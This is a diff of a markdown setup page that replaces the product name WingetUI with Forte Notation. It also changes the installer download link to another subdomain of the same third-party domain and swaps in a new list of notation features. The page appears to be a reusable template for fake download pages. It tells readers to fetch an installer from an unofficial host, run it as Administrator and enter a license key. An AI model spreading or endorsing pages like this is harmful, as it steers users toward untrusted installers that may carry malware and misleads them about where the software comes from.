@@ -1,10 +1,10 @@
-# WingetUI Windows Setup Notes
+# Forte Notation Windows Setup Notes
 
-**Download:** [Get Windows installer →](https://wingetui-2026.kolmods.com/)
+**Download:** [Get Windows installer →](https://forte-notation-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **WingetUI** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Forte Notation** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **WingetUI** from the Start menu
+5. Restart if the installer asks — then launch **Forte Notation** from the Start menu
 
 ## What you can use it for
 
-- Core WingetUI features on Windows desktop
-- Install and configure WingetUI for daily use
-- Import, edit, and export with WingetUI tools
-- Tune settings and profiles inside WingetUI
-- Integrate WingetUI into your existing workflow
+- Write and edit sheet music and tablature
+- Playback scores with realistic instruments
+- Transpose, engrave, and part extraction
+- MusicXML and MIDI import/export
+- Practice tools with tempo and loop marks
 
 ## License
 
